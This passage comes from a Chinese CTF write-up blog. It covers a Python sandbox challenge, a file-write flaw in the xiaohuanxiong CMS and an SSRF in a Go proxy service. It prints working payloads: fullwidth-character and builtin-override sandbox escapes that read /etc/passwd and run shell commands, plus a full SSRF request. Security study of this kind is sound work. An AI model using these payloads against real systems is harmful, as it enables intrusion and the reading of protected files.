class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):  </span><br><span class="line">    <span class="comment"># 定义了一个名为do的函数，它接受一个参数source_code，这个参数预期是一个包含Python源代码的字符串。  </span></span><br><span class="line">  </span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):  </span></span><br><span class="line"><span class="string">    # 定义了一个审计钩子函数my_audit_hook，它接受两个参数：event_name和arg。  </span></span><br><span class="line"><span class="string">    # 这个函数会在Python的审计事件发生时被调用。  </span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]  </span></span><br><span class="line"><span class="string">    # 定义了一个黑名单列表，包含了一些可能被认为是不安全的函数名。  </span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:  </span></span><br><span class="line"><span class="string">        # 检查事件名称的长度是否超过4个字符。  </span></span><br><span class="line"><span class="string">        # 注意：这个检查可能并不直接与安全相关，它可能是一个示例或占位符。  </span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)  </span></span><br><span class="line"><span class="string">    # 如果事件名称太长，则抛出运行时错误。  </span></span><br><span class="line"><span class="string">    for bad in blacklist:  </span></span><br><span class="line"><span class="string">        # 遍历黑名单列表。  </span></span><br><span class="line"><span class="string">        if bad in event_name:  </span></span><br><span class="line"><span class="string">            # 检查事件名称是否包含黑名单中的任何字符串。  </span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)  </span></span><br><span class="line"><span class="string">    # 如果事件名称包含黑名单中的字符串，则抛出运行时错误。  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)  </span></span><br><span class="line"><span class="string"># 使用__import__函数动态导入sys模块，并调用其addaudithook方法注册审计钩子函数。  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>  </span><br><span class="line">    <span class="comment"># 多行字符串结束，此时hook_code变量包含了上述审计钩子函数的定义和注册代码。  </span></span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(source_code)  </span><br><span class="line">    <span class="comment"># 打印传入的源代码字符串，这在调试时可能有用，但在生产环境中可能泄露敏感信息。  </span></span><br><span class="line">  </span><br><span class="line">    code = hook_code + source_code  </span><br><span class="line">    <span class="comment"># 将审计钩子代码和传入的源代码拼接在一起，形成一个完整的Python脚本。  </span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 注意：下面这行代码实际上并没有在后续逻辑中使用tree变量。  </span></span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)  </span><br><span class="line">    <span class="comment"># 使用compile函数尝试将源代码编译为字节码，但实际上由于指定了ast.PyCF_ONLY_AST标志，  </span></span><br><span class="line">    <span class="comment"># 这行代码会返回一个AST（抽象语法树）对象而不是字节码。然而，这个AST对象并没有被后续代码使用。  </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        <span class="comment"># 尝试执行以下代码块。  </span></span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):  </span><br><span class="line">            <span class="comment"># 调用一个名为verify_secure的函数，传入之前编译得到的AST对象（尽管这个对象并没有真正被使用）。  </span></span><br><span class="line">            <span class="comment"># 注意：verify_secure函数没有在代码中定义，因此这段代码在实际运行时会抛出NameError。  </span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">                <span class="comment"># 打开（或创建）一个名为run.py的文件，并准备写入内容。  </span></span><br><span class="line">                f.write(code)  </span><br><span class="line">            <span class="comment"># 将之前拼接好的代码写入run.py文件。  </span></span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)  </span><br><span class="line">            <span class="comment"># 使用subprocess模块运行run.py脚本，捕获其标准输出，并尝试将输出解码为UTF-8字符串。  </span></span><br><span class="line">            <span class="comment"># 这里还设置了一个5秒的超时时间。  </span></span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)  </span><br><span class="line">            <span class="comment"># 删除run.py文件，清理执行环境。  </span></span><br><span class="line">            <span class="keyword">return</span> result  </span><br><span class="line">        <span class="comment"># 如果verify_secure函数返回True（表示代码被认为是安全的），则执行上述代码块并返回执行结果。  </span></span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="comment"># 如果代码被认为是不安全的，则返回一条消息表示执行被中止。  </span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span>  </span><br><span class="line">    <span class="keyword">except</span>:  </span><br><span class="line">        <span class="comment"># 捕获所有异常（这是一个不推荐的做法，因为它会捕获包括编程错误在内的所有异常）。  </span></span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)  </span><br><span class="line">        <span class="comment"># 无论发生什么异常，都尝试删除run.py文件。  </span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span>  </span><br><span class="line">    <span class="comment"># 如果发生异常，则返回一条可能误导的消息（&quot;Timeout!&quot;），即使异常的原因可能并不是超时。</span></span><br></pre></td></tr></table></figure><p>​大概就这些了，先做个测试吧，半角形式似乎能绕过符号正则匹配：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;blocks&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;languageVersion&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;blocks&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;text&quot;</span><span class="punctuation">,</span><span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;TEXT&quot;</span><span class="punctuation">:</span><span class="string">&quot;＇；ｐｒｉｎｔ（ｏｐｅｎ（＂／ｅｔｃ／ｐａｓｓｗｄ＂）．ｒｅａｄ（））＃&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>​根据上面的绕过沙箱方式，这里可以让 len 永久性小于 1，就是重写内置函数 len，构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;__import__(&#x27;</span>sys<span class="string">&#x27;).modules[&#x27;</span>__main__<span class="string">&#x27;].__dict__[&#x27;</span>__builtins__<span class="string">&#x27;].__dict__[&#x27;</span><span class="built_in">len</span><span class="string">&#x27;] = lambda x: 1</span></span><br></pre></td></tr></table></figure><p>​之后就是读 flag 了：<span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZGQvJUVGJUJDJThDJUU5JTlDJTgwJUU4JUE2JTgxJUU3JTk0JUE4JUU1JTg4JUIwJUU4JUJGJTk5JUU0JUI4JUFBJUVGJUJDJThDJUU0JUI4JThEJUU4JUJGJTg3JUU0JUI4JThEJUU3JTlGJUE1JUU5JTgxJTkzJUU1JTg1JUI3JUU0JUJEJTkzJUU1JThFJTlGJUU3JTkwJTg2JUVGJUJDJThDJUU0JUJDJUIwJUU2JTkxJUI4JUU3JTlEJTgwJUU1JUJBJTk0JUU4JUFGJUE1JUU2JTk4JUFGJUU2JThGJTkwJUU2JTlEJTgzJUVGJUJDJThDJUU2JUFGJTk1JUU3JUFCJTlGJUU2JUIyJTk5JUU3JUFFJUIxJUU1JThGJUFGJUU4JTgzJUJEJUU2JUIyJUExJUU2JTlDJTg5JUU2JTlEJTgzJUU5JTk5JTkwJUVGJUJDJTg4JUU3JThDJTlDJUU3JTlBJTg0JUVGJUJDJThDJUU1JThGJUFGJUU4JTgzJUJEJUU0JUI4JThEJUU1JUFGJUI5JUVGJUJDJTg5JUUzJTgwJTgy">https://gtfobins.github.io/gtfobins/dd/，需要用到这个，不过不知道具体原理，估摸着应该是提权，毕竟沙箱可能没有权限（猜的，可能不对）。</span></p><p>​payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;__import__(&#x27;</span>sys<span class="string">&#x27;).modules[&#x27;</span>__main__<span class="string">&#x27;].__dict__[&#x27;</span>__builtins__<span class="string">&#x27;].__dict__[&#x27;</span><span class="built_in">len</span><span class="string">&#x27;] = lambda x: 1</span></span><br><span class="line"><span class="string">print(len(&quot;aaaaaa&quot;))</span></span><br><span class="line"><span class="string">__import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span>ls<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">__import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span>LFILE=file_to_read dd <span class="keyword">if</span>=/flag<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">__import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span>find / -user root -perm -<span class="number">4000</span> -<span class="built_in">print</span> <span class="number">2</span>&gt;/dev/null<span class="string">&#x27;)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#改为半角，加上\n：</span></span><br><span class="line"><span class="string">＇；＿＿ｉｍｐｏｒｔ＿＿（＇ｓｙｓ＇）．ｍｏｄｕｌｅｓ［＇＿＿ｍａｉｎ＿＿＇］．＿＿ｄｉｃｔ＿＿［＇＿＿ｂｕｉｌｔｉｎｓ＿＿＇］．＿＿ｄｉｃｔ＿＿［＇ｌｅｎ＇］ ＝ ｌａｍｂｄａ ｘ： １\nｐｒｉｎｔ（ｌｅｎ（＂ａａａａａａ＂））\n＿＿ｉｍｐｏｒｔ＿＿（＇ｏｓ＇）．ｓｙｓｔｅｍ（＇ｌｓ＇）\n＿＿ｉｍｐｏｒｔ＿＿（＇ｏｓ＇）．ｓｙｓｔｅｍ（＇ＬＦＩＬＥ＝ｆｉｌｅ＿ｔｏ＿ｒｅａｄ ｄｄ ｉｆ＝／ｆｌａｇ＇）\n＿＿ｉｍｐｏｒｔ＿＿（＇ｏｓ＇）．ｓｙｓｔｅｍ（＇ｆｉｎｄ ／ －ｕｓｅｒ ｒｏｏｔ －ｐｅｒｍ －４０００ －ｐｒｉｎｔ ２＞／ｄｅｖ／ｎｕｌｌ＇）＃</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h2 id="xiaohuanxiong"><a class="markdownIt-Anchor" href="#xiaohuanxiong">#</a> xiaohuanxiong：</h2><p>​项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZvcmthYmxlL3hpYW9odWFueGlvbmc=">https://github.com/forkable/xiaohuanxiong</span></p><p>​开始审计：</p><p>​存在 admin 文件夹，那估计洞可能在 admin 里面，先看里面：</p><ol><li>Admins 有创建、管理、删除管理员用户的功能，推测可能会有洞，但实际上并没有用到这里。</li><li>Areas、Authors、Banners、BaseAdmin、Books、Chapters 一直到 Login 都没啥用，就正常的管理系统</li></ol><p>​当看到 Payment 的时候，发现了一个重要的点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//支付配置文件</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">isPost</span>()) &#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;json&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="title class_">App</span>::<span class="title function_ invoke__">getRootPath</span>() . <span class="string">&#x27;config/payment.php&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&#x27;保存成功&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="title class_">App</span>::<span class="title function_ invoke__">getRootPath</span>() . <span class="string">&#x27;config/payment.php&#x27;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;json&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">view</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​保存配置文件，存在文件写入的问题，写入的还是 php 文件，之后进入 admin/payment 看看，发现了这些：</p><p><img data-src="https://i-blog.csdnimg.cn/direct/5d7af358c0c44f88a3533e0b7ad15c01.png#pic_center" alt="在这里插入图片描述"></p><p>​这里面写入 payload 即可：</p><p><img data-src="https://i-blog.csdnimg.cn/direct/fe6bfe2f95e64d48ad701b6676f12492.png#pic_center" alt="在这里插入图片描述"></p><p>​<img data-src="https://i-blog.csdnimg.cn/direct/fbe689cea973480aa83b960ff34ec977.png#pic_center" alt="在这里插入图片描述"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2db4c362-5f6f-4c81-b77e-d27ec7fcb6aa&#125;</span><br></pre></td></tr></table></figure><h2 id="proxy"><a class="markdownIt-Anchor" href="#proxy">#</a> proxy：</h2><p>​这段代码定义了一个使用 Gin 框架的 Go Web 服务器，它提供了两个 API 接口，分别位于  <code>/v1/api/flag</code>  和  <code>/v2/api/proxy</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ProxyRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">URL             <span class="type">string</span>            <span class="string">`json:&quot;url&quot; binding:&quot;required&quot;`</span></span><br><span class="line">Method          <span class="type">string</span>            <span class="string">`json:&quot;method&quot; binding:&quot;required&quot;`</span></span><br><span class="line">Body            <span class="type">string</span>            <span class="string">`json:&quot;body&quot;`</span></span><br><span class="line">Headers         <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span> <span class="string">`json:&quot;headers&quot;`</span></span><br><span class="line">FollowRedirects <span class="type">bool</span>              <span class="string">`json:&quot;follow_redirects&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line"></span><br><span class="line">v1 := r.Group(<span class="string">&quot;/v1&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">v1.POST(<span class="string">&quot;/api/flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;/readflag&quot;</span>)</span><br><span class="line">flag, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;flag&quot;</span>: flag&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v2 := r.Group(<span class="string">&quot;/v2&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">v2.POST(<span class="string">&quot;/api/proxy&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> proxyRequest ProxyRequest</span><br><span class="line"><span class="keyword">if</span> err := c.ShouldBindJSON(&amp;proxyRequest); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">client := &amp;http.Client&#123;</span><br><span class="line">CheckRedirect: <span class="function"><span class="keyword">func</span><span class="params">(req *http.Request, via []*http.Request)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">if</span> !req.URL.IsAbs() &#123;</span><br><span class="line"><span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !proxyRequest.FollowRedirects &#123;</span><br><span class="line"><span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req, err := http.NewRequest(proxyRequest.Method, proxyRequest.URL, bytes.NewReader([]<span class="type">byte</span>(proxyRequest.Body)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> proxyRequest.Headers &#123;</span><br><span class="line">req.Header.Set(key, value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp, err := client.Do(req)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line">body, err := io.ReadAll(resp.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.Status(resp.StatusCode)</span><br><span class="line"><span class="keyword">for</span> key, value := <span class="keyword">range</span> resp.Header &#123;</span><br><span class="line">c.Header(key, value[<span class="number">0</span>])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.Writer.Write(body)</span><br><span class="line">c.Abort()</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r.Run(<span class="string">&quot;127.0.0.1:8769&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​先看看 /v1/api/flag：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v1 := r.Group(<span class="string">&quot;/v1&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">v1.POST(<span class="string">&quot;/api/flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;/readflag&quot;</span>)</span><br><span class="line">flag, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;flag&quot;</span>: flag&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​读取 flag 文件， 然后返回输出。</p><p>​ <code>/v2/api/proxy</code>  存在 ssrf。直接访问 flag 无法访问，因此需要 ssrf。</p><p>​正好，给了配置文件：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">server <span class="punctuation">&#123;</span></span><br><span class="line">    listen <span class="number">8000</span>;</span><br><span class="line"></span><br><span class="line">    location ~ /v1 <span class="punctuation">&#123;</span></span><br><span class="line">        return <span class="number">403</span>;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">    location ~ /v2 <span class="punctuation">&#123;</span></span><br><span class="line">        proxy_pass http<span class="punctuation">:</span><span class="comment">//localhost:8769;</span></span><br><span class="line">        proxy_http_version <span class="number">1.1</span>;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection $connection_upgrade;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>​根据 <code>proxy_set_header X-Real-IP $remote_addr;</code> , 可以确定能打 ssrf。</p><p>​/v2/api/proxy 是以 json 形式发包的，可以搞：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/v2/api/proxy</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39.107.225.62:30903</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>142</span><br><span class="line"></span><br><span class="line"><span class="language-css">&#123;&quot;url&quot;:<span class="string">&quot;http://127.0.0.1:8769/v1/api/flag&quot;</span>,<span class="string">&quot;method&quot;</span>:<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;headers&quot;</span>:&#123;&quot;<span class="attribute">Content</span>-Type&quot;:<span class="string">&quot;application/json&quot;</span>&#125;,&quot;<span class="selector-tag">body</span>&quot;:<span class="string">&quot;&quot;</span>,<span class="string">&quot;follow_redirects&quot;</span>:false</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br></pre></td></tr></table></figure><p>​响应：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.27.0</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sun, 03 Nov 2024 07:11:08 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>67</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span 